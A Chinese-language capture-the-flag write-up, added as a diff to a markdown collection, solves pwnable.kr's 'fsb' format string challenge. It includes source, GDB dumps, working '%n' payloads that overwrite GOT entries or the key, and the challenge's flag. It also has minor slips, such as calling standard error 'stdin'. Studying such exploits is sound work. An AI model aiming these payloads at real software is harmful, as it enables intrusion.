@@ -13907,3 +13907,496 @@ What a tiny task :) good job!
 
 ------
 
+### fsb
+
+这是**Pwnable.kr**的第二十八个挑战`fsb`，来自**[Rookiss]**部分。
+
+```bash
+Isn't FSB almost obsolete in computer security?
+Anyway, have fun with it :)
+
+ssh fsb@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh fsb@pwnable.kr -p2222
+fsb@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Sat Jun 24 03:40:18 2023 from 121.60.43.65
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+fsb@pwnable:~$ ls -la
+total 36
+drwxr-x---   5 root fsb     4096 Oct 23  2016 .
+drwxr-xr-x 117 root root    4096 Nov 10  2022 ..
+d---------   2 root root    4096 Jun 30  2014 .bash_history
+-r--r-----   1 root fsb_pwn   68 Jun 30  2014 flag
+-r-xr-sr-x   1 root fsb_pwn 7500 Jun 30  2014 fsb
+-rw-r--r--   1 root root    1167 Jun 30  2014 fsb.c
+dr-xr-xr-x   2 root root    4096 Aug 20  2014 .irssi
+drwxr-xr-x   2 root root    4096 Oct 23  2016 .pwntools-cache
+```
+
+输入`cat fsb.c`来查看`fsb.c`的代码。
+
+```c
+fsb@pwnable:~$ cat fsb.c
+#include <stdio.h>
+#include <alloca.h>
+#include <fcntl.h>
+
+unsigned long long key;
+char buf[100];
+char buf2[100];
+
+int fsb(char** argv, char** envp){
+    char* args[]={"/bin/sh", 0};  // 该字符串数组用于execve()函数调用
+    int i;
+
+    char*** pargv = &argv;  // 该指针指向参数argv的指针
+    char*** penvp = &envp;  // 该指针指向环境变量envp的指针
+    char** arg;
+    char* c;
+    for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';  // 清空参数argv中的字符
+    for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';  // 清空环境变量envp中的字符
+    *pargv=0;
+    *penvp=0;
+
+    for(i=0; i<4; i++){
+        printf("Give me some format strings(%d)\n", i+1);
+        read(0, buf, 100);  // 从标准输入中读取用户输入的字符串
+        printf(buf);  // 将用户输入的字符串作为格式化字符串打印, 存在格式化字符串漏洞
+    }
+
+    printf("Wait a sec...\n");
+    sleep(3);
+
+    printf("key : \n");
+    read(0, buf2, 100);  // 从标准输入中读取用户输入的key
+    unsigned long long pw = strtoull(buf2, 0, 10);  // 将用户输入的字符串buf2转换为无符号64位十进制整数
+    if(pw == key){
+        printf("Congratz!\n");
+        execve(args[0], args, 0);  // 执行/bin/sh程序, 实现提权
+        return 0;
+    }
+
+    printf("Incorrect key \n");
+    return 0;
+}
+
+int main(int argc, char* argv[], char** envp){
+    int fd = open("/dev/urandom", O_RDONLY);  //  打开/dev/urandom设备文件
+    if( fd==-1 || read(fd, &key, 8) != 8 ){   // 从/dev/urandom中读取8字节随机数作为key
+        printf("Error, tell admin\n");
+        return 0;
+    }
+    close(fd);  // 关闭/dev/urandom设备文件
+
+    alloca(0x12345 & key);  // 使用alloca函数分配栈空间，分配大小为0x12345和key的按位与结果
+	// 调用fsb函数，利用格式化字符串漏洞进行攻击
+    fsb(argv, envp); // exploit this format string bug!
+    return 0;
+}
+```
+
+这道题考察的知识点应该是`fsb`函数中的格式化字符串漏洞，在`fsb`函数中程序先从`stdin`读取四个最多100字节的字符串到`buf`变量并使用`printf`输出格式化字符串。随后，从`stdin`读取用户输入的`buf2`并转换成64位十进制无符号整数`pw`，如果`pw`和全局变量`key`数值相等就能获得`shell`。
+
+```assembly
+fsb@pwnable:~$ gdb ./fsb
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080486df <+0>:     lea    ecx,[esp+0x4]
+   0x080486e3 <+4>:     and    esp,0xfffffff0
+   0x080486e6 <+7>:     push   DWORD PTR [ecx-0x4]
+   0x080486e9 <+10>:    push   ebp
+   0x080486ea <+11>:    mov    ebp,esp
+   0x080486ec <+13>:    push   ebx
+   0x080486ed <+14>:    push   ecx
+   0x080486ee <+15>:    sub    esp,0x30
+   0x080486f1 <+18>:    mov    ebx,ecx
+   0x080486f3 <+20>:    mov    DWORD PTR [esp+0x4],0x0
+   0x080486fb <+28>:    mov    DWORD PTR [esp],0x80488c7
+   0x08048702 <+35>:    call   0x8048430 <open@plt>
+   0x08048707 <+40>:    mov    DWORD PTR [ebp-0xc],eax
+   0x0804870a <+43>:    cmp    DWORD PTR [ebp-0xc],0xffffffff
+   0x0804870e <+47>:    je     0x8048730 <main+81>
+   0x08048710 <+49>:    mov    DWORD PTR [esp+0x8],0x8
+   0x08048718 <+57>:    mov    DWORD PTR [esp+0x4],0x804a060
+   0x08048720 <+65>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x08048723 <+68>:    mov    DWORD PTR [esp],eax
+   0x08048726 <+71>:    call   0x80483e0 <read@plt>
+   0x0804872b <+76>:    cmp    eax,0x8
+   0x0804872e <+79>:    je     0x8048743 <main+100>
+   0x08048730 <+81>:    mov    DWORD PTR [esp],0x80488d4
+   0x08048737 <+88>:    call   0x8048410 <puts@plt>
+   0x0804873c <+93>:    mov    eax,0x0
+   0x08048741 <+98>:    jmp    0x8048796 <main+183>
+   0x08048743 <+100>:   mov    eax,DWORD PTR [ebp-0xc]
+   0x08048746 <+103>:   mov    DWORD PTR [esp],eax
+   0x08048749 <+106>:   call   0x8048470 <close@plt>
+   0x0804874e <+111>:   mov    eax,ds:0x804a060          # key_addr起始地址: 0x804a060  
+   0x08048753 <+116>:   mov    edx,DWORD PTR ds:0x804a064
+   0x08048759 <+122>:   and    eax,0x12345
+   0x0804875e <+127>:   lea    edx,[eax+0xf]
+   0x08048761 <+130>:   mov    eax,0x10
+   0x08048766 <+135>:   sub    eax,0x1
+   0x08048769 <+138>:   add    eax,edx
+   0x0804876b <+140>:   mov    DWORD PTR [ebp-0x1c],0x10
+   0x08048772 <+147>:   mov    edx,0x0
+   0x08048777 <+152>:   div    DWORD PTR [ebp-0x1c]
+   0x0804877a <+155>:   imul   eax,eax,0x10
+   0x0804877d <+158>:   sub    esp,eax
+   0x0804877f <+160>:   mov    eax,DWORD PTR [ebx+0x8]
+   0x08048782 <+163>:   mov    DWORD PTR [esp+0x4],eax
+   0x08048786 <+167>:   mov    eax,DWORD PTR [ebx+0x4]
+   0x08048789 <+170>:   mov    DWORD PTR [esp],eax
+   0x0804878c <+173>:   call   0x8048534 <fsb>
+   0x08048791 <+178>:   mov    eax,0x0
+   0x08048796 <+183>:   lea    esp,[ebp-0x8]
+   0x08048799 <+186>:   pop    ecx
+   0x0804879a <+187>:   pop    ebx
+   0x0804879b <+188>:   pop    ebp
+   0x0804879c <+189>:   lea    esp,[ecx-0x4]
+   0x0804879f <+192>:   ret    
+End of assembler dump.
+(gdb) disassemble fsb
+Dump of assembler code for function fsb:
+   0x08048534 <+0>:     push   ebp
+   0x08048535 <+1>:     mov    ebp,esp
+   0x08048537 <+3>:     sub    esp,0x48
+   0x0804853a <+6>:     mov    DWORD PTR [ebp-0x24],0x8048870
+   0x08048541 <+13>:    mov    DWORD PTR [ebp-0x20],0x0
+   0x08048548 <+20>:    lea    eax,[ebp+0x8]
+   0x0804854b <+23>:    mov    DWORD PTR [ebp-0x10],eax
+   0x0804854e <+26>:    lea    eax,[ebp+0xc]
+   0x08048551 <+29>:    mov    DWORD PTR [ebp-0xc],eax
+   0x08048554 <+32>:    mov    eax,DWORD PTR [ebp+0x8]
+   0x08048557 <+35>:    mov    DWORD PTR [ebp-0x18],eax
+   0x0804855a <+38>:    jmp    0x804857e <fsb+74>
+   0x0804855c <+40>:    mov    eax,DWORD PTR [ebp-0x18]
+   0x0804855f <+43>:    mov    eax,DWORD PTR [eax]
+   0x08048561 <+45>:    mov    DWORD PTR [ebp-0x14],eax
+   0x08048564 <+48>:    jmp    0x8048570 <fsb+60>
+   0x08048566 <+50>:    mov    eax,DWORD PTR [ebp-0x14]
+   0x08048569 <+53>:    mov    BYTE PTR [eax],0x0
+   0x0804856c <+56>:    add    DWORD PTR [ebp-0x14],0x1
+   0x08048570 <+60>:    mov    eax,DWORD PTR [ebp-0x14]
+   0x08048573 <+63>:    movzx  eax,BYTE PTR [eax]
+   0x08048576 <+66>:    test   al,al
+   0x08048578 <+68>:    jne    0x8048566 <fsb+50>
+   0x0804857a <+70>:    add    DWORD PTR [ebp-0x18],0x4
+   0x0804857e <+74>:    mov    eax,DWORD PTR [ebp-0x18]
+   0x08048581 <+77>:    mov    eax,DWORD PTR [eax]
+   0x08048583 <+79>:    test   eax,eax
+   0x08048585 <+81>:    jne    0x804855c <fsb+40>
+   0x08048587 <+83>:    mov    eax,DWORD PTR [ebp+0xc]
+   0x0804858a <+86>:    mov    DWORD PTR [ebp-0x18],eax
+   0x0804858d <+89>:    jmp    0x80485b1 <fsb+125>
+   0x0804858f <+91>:    mov    eax,DWORD PTR [ebp-0x18]
+   0x08048592 <+94>:    mov    eax,DWORD PTR [eax]
+   0x08048594 <+96>:    mov    DWORD PTR [ebp-0x14],eax
+   0x08048597 <+99>:    jmp    0x80485a3 <fsb+111>
+   0x08048599 <+101>:   mov    eax,DWORD PTR [ebp-0x14]
+   0x0804859c <+104>:   mov    BYTE PTR [eax],0x0
+   0x0804859f <+107>:   add    DWORD PTR [ebp-0x14],0x1
+   0x080485a3 <+111>:   mov    eax,DWORD PTR [ebp-0x14]
+   0x080485a6 <+114>:   movzx  eax,BYTE PTR [eax]
+   0x080485a9 <+117>:   test   al,al
+   0x080485ab <+119>:   jne    0x8048599 <fsb+101>
+   0x080485ad <+121>:   add    DWORD PTR [ebp-0x18],0x4
+   0x080485b1 <+125>:   mov    eax,DWORD PTR [ebp-0x18]
+   0x080485b4 <+128>:   mov    eax,DWORD PTR [eax]
+   0x080485b6 <+130>:   test   eax,eax
+   0x080485b8 <+132>:   jne    0x804858f <fsb+91>
+   0x080485ba <+134>:   mov    eax,DWORD PTR [ebp-0x10]
+   0x080485bd <+137>:   mov    DWORD PTR [eax],0x0
+   0x080485c3 <+143>:   mov    eax,DWORD PTR [ebp-0xc]
+   0x080485c6 <+146>:   mov    DWORD PTR [eax],0x0
+   0x080485cc <+152>:   mov    DWORD PTR [ebp-0x1c],0x0
+   0x080485d3 <+159>:   jmp    0x8048619 <fsb+229>
+   0x080485d5 <+161>:   mov    eax,DWORD PTR [ebp-0x1c]
+   0x080485d8 <+164>:   lea    edx,[eax+0x1]
+   0x080485db <+167>:   mov    eax,0x8048878
+   0x080485e0 <+172>:   mov    DWORD PTR [esp+0x4],edx
+   0x080485e4 <+176>:   mov    DWORD PTR [esp],eax
+   0x080485e7 <+179>:   call   0x80483f0 <printf@plt>
+   0x080485ec <+184>:   mov    DWORD PTR [esp+0x8],0x64
+   0x080485f4 <+192>:   mov    DWORD PTR [esp+0x4],0x804a100
+   0x080485fc <+200>:   mov    DWORD PTR [esp],0x0
+   0x08048603 <+207>:   call   0x80483e0 <read@plt>     # read
+   0x08048608 <+212>:   mov    eax,0x804a100
+   0x0804860d <+217>:   mov    DWORD PTR [esp],eax
+   0x08048610 <+220>:   call   0x80483f0 <printf@plt>   # break point
+   0x08048615 <+225>:   add    DWORD PTR [ebp-0x1c],0x1
+   0x08048619 <+229>:   cmp    DWORD PTR [ebp-0x1c],0x3
+   0x0804861d <+233>:   jle    0x80485d5 <fsb+161>
+   0x0804861f <+235>:   mov    DWORD PTR [esp],0x8048899
+   0x08048626 <+242>:   call   0x8048410 <puts@plt>
+   0x0804862b <+247>:   mov    DWORD PTR [esp],0x3
+   0x08048632 <+254>:   call   0x8048400 <sleep@plt>
+   0x08048637 <+259>:   mov    DWORD PTR [esp],0x80488a7
+   0x0804863e <+266>:   call   0x8048410 <puts@plt>
+   0x08048643 <+271>:   mov    DWORD PTR [esp+0x8],0x64
+   0x0804864b <+279>:   mov    DWORD PTR [esp+0x4],0x804a080
+   0x08048653 <+287>:   mov    DWORD PTR [esp],0x0
+   0x0804865a <+294>:   call   0x80483e0 <read@plt>
+   0x0804865f <+299>:   mov    DWORD PTR [esp+0x8],0xa
+   0x08048667 <+307>:   mov    DWORD PTR [esp+0x4],0x0
+   0x0804866f <+315>:   mov    DWORD PTR [esp],0x804a080
+   0x08048676 <+322>:   call   0x8048460 <strtoull@plt>
+   0x0804867b <+327>:   mov    edx,eax
+   0x0804867d <+329>:   sar    edx,0x1f
+   0x08048680 <+332>:   mov    DWORD PTR [ebp-0x30],eax
+   0x08048683 <+335>:   mov    DWORD PTR [ebp-0x2c],edx
+   0x08048686 <+338>:   mov    eax,ds:0x804a060          # key_addr: 0x804a060
+   0x0804868b <+343>:   mov    edx,DWORD PTR ds:0x804a064
+   0x08048691 <+349>:   mov    ecx,edx
+   0x08048693 <+351>:   xor    ecx,DWORD PTR [ebp-0x2c]
+   0x08048696 <+354>:   xor    eax,DWORD PTR [ebp-0x30]
+   0x08048699 <+357>:   or     eax,ecx
+   0x0804869b <+359>:   test   eax,eax
+   0x0804869d <+361>:   jne    0x80486cc <fsb+408>
+   0x0804869f <+363>:   mov    DWORD PTR [esp],0x80488ae  # 调用 execve("/bin/sh")
+   0x080486a6 <+370>:   call   0x8048410 <puts@plt>
+   0x080486ab <+375>:   mov    eax,DWORD PTR [ebp-0x24]   # 调用 execve("/bin/sh")
+   0x080486ae <+378>:   mov    DWORD PTR [esp+0x8],0x0
+   0x080486b6 <+386>:   lea    edx,[ebp-0x24]
+   0x080486b9 <+389>:   mov    DWORD PTR [esp+0x4],edx
+   0x080486bd <+393>:   mov    DWORD PTR [esp],eax
+   0x080486c0 <+396>:   call   0x8048450 <execve@plt>
+   0x080486c5 <+401>:   mov    eax,0x0
+   0x080486ca <+406>:   jmp    0x80486dd <fsb+425>
+   0x080486cc <+408>:   mov    DWORD PTR [esp],0x80488b8
+   0x080486d3 <+415>:   call   0x8048410 <puts@plt>
+   0x080486d8 <+420>:   mov    eax,0x0
+   0x080486dd <+425>:   leave  
+   0x080486de <+426>:   ret    
+End of assembler dump.
+(gdb) source /usr/share/peda/peda.py
+gdb-peda$ b *fsb+220
+Breakpoint 1 at 0x8048610
+gdb-peda$ r
+Starting program: /home/fsb/fsb 
+Give me some format strings(1)
+AAAAAAAA
+[----------------------------------registers-----------------------------------]
+EAX: 0x804a100 ("AAAAAAAA\n")
+EBX: 0xfffd0320 --> 0x1 
+ECX: 0x804a100 ("AAAAAAAA\n")
+EDX: 0x64 ('d')
+ESI: 0xf77b5000 --> 0x1b2db0 
+EDI: 0xf77b5000 --> 0x1b2db0 
+EBP: 0xfffbff68 --> 0xfffd0308 --> 0x0 
+ESP: 0xfffbff20 --> 0x804a100 ("AAAAAAAA\n")
+EIP: 0x8048610 (<fsb+220>:      call   0x80483f0 <printf@plt>)
+EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048603 <fsb+207>: call   0x80483e0 <read@plt>
+   0x8048608 <fsb+212>: mov    eax,0x804a100
+   0x804860d <fsb+217>: mov    DWORD PTR [esp],eax
+=> 0x8048610 <fsb+220>: call   0x80483f0 <printf@plt>
+   0x8048615 <fsb+225>: add    DWORD PTR [ebp-0x1c],0x1
+   0x8048619 <fsb+229>: cmp    DWORD PTR [ebp-0x1c],0x3
+   0x804861d <fsb+233>: jle    0x80485d5 <fsb+161>
+   0x804861f <fsb+235>: mov    DWORD PTR [esp],0x8048899
+Guessed arguments:
+arg[0]: 0x804a100 ("AAAAAAAA\n")
+[------------------------------------stack-------------------------------------]
+0000| 0xfffbff20 --> 0x804a100 ("AAAAAAAA\n")
+0004| 0xfffbff24 --> 0x804a100 ("AAAAAAAA\n")
+0008| 0xfffbff28 --> 0x64 ('d')
+0012| 0xfffbff2c --> 0x0 
+0016| 0xfffbff30 --> 0x0 
+0020| 0xfffbff34 --> 0x0 
+0024| 0xfffbff38 --> 0x0 
+0028| 0xfffbff3c --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x08048610 in fsb ()
+gdb-peda$ x/24wx $esp
+0xfffbff20:     0x0804a100      0x0804a100      0x00000064      0x00000000
+0xfffbff30:     0x00000000      0x00000000      0x00000000      0x00000000
+0xfffbff40:     0x00000000      0x08048870      0x00000000      0x00000000
+0xfffbff50:     0xfffd0408      0xfffd0fe9      0xfffbff70      0xfffbff74
+0xfffbff60:     0x00000000      0x00000000      0xfffd0308      0x08048791
+0xfffbff70:     0x00000000      0x00000000      0x00000000      0x00000000
+gdb-peda$ stack 24
+0000| 0xfffbff20 --> 0x804a100 ("AAAAAAAA\n")
+0004| 0xfffbff24 --> 0x804a100 ("AAAAAAAA\n")
+0008| 0xfffbff28 --> 0x64 ('d')
+0012| 0xfffbff2c --> 0x0 
+0016| 0xfffbff30 --> 0x0 
+0020| 0xfffbff34 --> 0x0 
+0024| 0xfffbff38 --> 0x0 
+0028| 0xfffbff3c --> 0x0 
+0032| 0xfffbff40 --> 0x0 
+0036| 0xfffbff44 --> 0x8048870 ("/bin/sh")
+0040| 0xfffbff48 --> 0x0 
+0044| 0xfffbff4c --> 0x0 
+0048| 0xfffbff50 --> 0xfffd0408 --> 0x0 
+0052| 0xfffbff54 --> 0xfffd0fe9 --> 0x6f682f00 ('')
+0056| 0xfffbff58 --> 0xfffbff70 --> 0x0 
+0060| 0xfffbff5c --> 0xfffbff74 --> 0x0 
+0064| 0xfffbff60 --> 0x0 
+0068| 0xfffbff64 --> 0x0 
+0072| 0xfffbff68 --> 0xfffd0308 --> 0x0 
+0076| 0xfffbff6c --> 0x8048791 (<main+178>:     mov    eax,0x0)
+0080| 0xfffbff70 --> 0x0 
+0084| 0xfffbff74 --> 0x0 
+0088| 0xfffbff78 --> 0x0 
+0092| 0xfffbff7c --> 0x0
+```
+
+注意到栈中第`14`和`15`个位置的值：`0xfffbff70`和`0xfffbff74`，它们正好指向后面的内存位置，即第`20`和`21`。`key`的起始地址是`0x804a060`（其十进制是`134520928`），并没有在栈上出现，有个大佬用了个有趣的办法 [**exploit.py**](https://github.com/giladreti/pwnable/blob/master/fsb/exploit.py) ——赌`0x804a060`在栈中。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ python fsb.py
+[*] '/home/tyd/ctf/pwn/pwnable.kr/fsb'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Connecting to pwnable.kr on port 2222: Done
+[*] fsb@pwnable.kr:
+    Distro    Ubuntu 16.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.4.179
+    ASLR:     Enabled
+[+] Opening new channel: b'pwd': Done
+[+] Receiving all data: Done (10B)
+[*] Closed SSH channel with pwnable.kr
+[*] Working directory: '/tmp/tmp.aqBDhRcrZk'
+[+] Opening new channel: b'ln -s /home/fsb/* .': Done
+[+] Receiving all data: Done (0B)
+[*] Closed SSH channel with pwnable.kr
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 1740
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 1740)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 2161
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 2161)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 2592
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 2592)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 3011
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 3011)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 3504
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 3504)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 3929
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 3929)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 4347
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 4347)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 4810
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 4810)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 5317
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 5317)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 5785
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 5785)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 6244
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 6244)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 6984
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 6984)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 7500
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 7500)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 7978
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 7978)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 8412
+[*] Stopped remote process 'fsb' on pwnable.kr (pid 8412)
+[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 8943
+[+] flag = 'Have you ever saw an example of utilizing [n] format character?? :('
+```
+
+正经办法的话，我们可以构造格式化字符串`%134520928d%14$n `，其中`%n`是一个格式化字符串的特殊格式，用于写入已经读取的字符数写入到相应的参数位置中。在`Linux`系统中，模块之间的调用使用*全局偏移表 (GOT)*进行，GOT表存在于可写内存中，包含函数的地址列表，并在模块加载时填充，这意味着修改GOT表可以在不触发任何内存保护的情况下实现。
+
+```assembly
+0x08048603 <+207>:   call   0x80483e0 <read@plt>
+... ...
+0x0804869f <+363>:   mov    DWORD PTR [esp],0x80488ae  # 调用 execve("/bin/sh")
+```
+
+可以看到`read()`函数的GOT表地址`0x804a000`（十进制数值是`134520832`）。
+
+```assembly
+gdb-peda$ disassemble 0x80483e0
+Dump of assembler code for function read@plt:
+   0x080483e0 <+0>:     jmp    DWORD PTR ds:0x804a000
+   0x080483e6 <+6>:     push   0x0
+   0x080483eb <+11>:    jmp    0x80483d0
+End of assembler dump.
+```
+
+采用两阶段攻击时，我们可以先将`0x804a000`写入第`14`个位置，再将调用 `execve("/bin/sh")` 的`0x804869f`写入到第20个位置，即第14个位置所指向的内存地址。这会导致执行`read()`时直接调用 `execve("/bin/sh")`，而无需再核对用户输入的`pw`是否为`key`。此外，我们需要确保程序的输出被送入`/dev/null`中，因为它有足够多的空间用来打印字符，我们用`(>&2 cat flag)`把文件`flag`中的内容输出到标准错误流`stdin`，可以看到`Have you ever saw an example of utilizing [n] format character?? :(`。
+
+```bash
+fsb@pwnable:~$ ./fsb >/dev/null
+%134520832c%14$n
+%134514335c%20$n
+(>&2 cat flag)
+Have you ever saw an example of utilizing [n] format character?? :(
+```
+
+与修改`read()`的GOT表同理，我们也可以修改`printf()`函数的。
+
+```assembly
+0x080485e7 <+179>:   call   0x80483f0 <printf@plt>
+```
+
+`0x804a004`的十进制数是`134520836`，`0x80486ab`的十进制数是`134514347`。
+
+```
+gdb-peda$ disassemble 0x80483f0
+Dump of assembler code for function printf@plt:
+   0x080483f0 <+0>:     jmp    DWORD PTR ds:0x804a004
+   0x080483f6 <+6>:     push   0x8
+   0x080483fb <+11>:    jmp    0x80483d0
+End of assembler dump.
+```
+
+同理，第15个位置指向第21个位置也是能被利用的。
+
+```bash
+fsb@pwnable:~$ ./fsb >/dev/null
+%134520836c%15$n
+%134514347c%21$n
+(>&2 cat flag)
+Have you ever saw an example of utilizing [n] format character?? :(
+```
+
+`key`的起始地址是`0x804a060`（其十进制是`134520928`），它还有一部分数据是紧接着保存在`0x804a060`（其十进制是`134520932`）。
+
+办法总比困难多。我们可以读取/写入`key`值，将其覆盖为`0`。全局变量`key`的类型是`unsigned long long`意味着它有八字节大小，所以我们还需要覆盖紧挨着起始地址`0x804a060`的后四个字节`0x804a064`。最后输入`pw`即`0`就能拿到`flag`啦。
+
+```bash
+fsb@pwnable:~$ ./fsb >/dev/null
+%134520928d%14$n           
+%20$n
+%134520932d%14$n
+%20$n
+0
+(>&2 cat flag)
+Have you ever saw an example of utilizing [n] format character?? :(
+```
+
+------
+
